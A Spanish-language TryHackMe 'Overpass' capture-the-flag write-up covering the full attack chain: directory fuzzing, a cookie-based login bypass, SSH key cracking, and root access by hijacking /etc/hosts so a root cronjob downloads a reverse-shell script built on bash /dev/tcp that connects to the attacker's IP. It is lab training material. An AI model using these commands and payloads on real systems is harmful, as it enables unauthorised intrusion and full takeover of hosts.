---
title: "TryHackMe - Overpass"
description: "bypass del login mediante cookie manual, obtención y crackeo de la clave SSH de james, y escalada a root aprovechando un cronjob que ejecuta un script remoto. Incluye montaje de servidor falso, manipulación de /etc/hosts y entrega de payload para acceso total."
pubDate: 2025-12-05
draft: false
tags: ["WFuzz", "SSH", "Cron", "Reverse Shell"]
---

## 🔍 Enumeración con Wfuzz

```bash
sudo wfuzz -c -L -t 400 --sc=200,301 \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
http://10.65.189.174/FUZZ
```

Ruta encontrada:
- `/admin` → página de login vulnerable.

---

## 🔐 Bypass de Login (Cookie Manual)

En el navegador:

- **Name:** SessionToken  
- **Value:** cualquier valor  
- **Domain:** IP de la víctima  

Esto permite saltar la autenticación.  
En `/admin` se obtiene la clave privada SSH de **james**.

---

## 🔓 Crack de clave SSH

```bash
/usr/share/john/ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Credenciales obtenidas:

```
james : james13
```

---

## ⚙️ Cronjob ejecutado por root

```bash
cat /etc/crontab
```

Salida relevante:

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Root ejecuta un script remoto **cada 1 minuto**.

---

## 🛠️ Host Hijacking (Modificación de /etc/hosts)

Reemplazar:

```
127.0.0.1 overpass.thm
```

Por:

```
192.168.167.173 overpass.thm
```

Esto redirige el dominio hacia nuestra máquina atacante.

---

## 📁 Estructura del Payload

```
overpass_root/
└── downloads/
    └── src/
        └── buildscript.sh
```

---

## 💣 Reverse Shell (buildscript.sh)

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.167.173/4444 0>&1
```

Permisos:

```bash
chmod +x buildscript.sh
```

---

## 🌐 Servidor HTTP en nuestra máquina

```bash
cd ~/overpass_root
sudo python3 -m http.server 80
```

Prueba desde la víctima:

```bash
curl http://overpass.thm/downloads/src/buildscript.sh
```

Debe devolver nuestro payload.

---

## 🎧 Listener en Kali

```bash
nc -lvnp 4444
```

Al minuto, el cron ejecuta nuestro script → Reverse Shell como root.

---

## 👑 Root Access

```
root@overpass-prod:/#
```

Máquina completada con éxito.
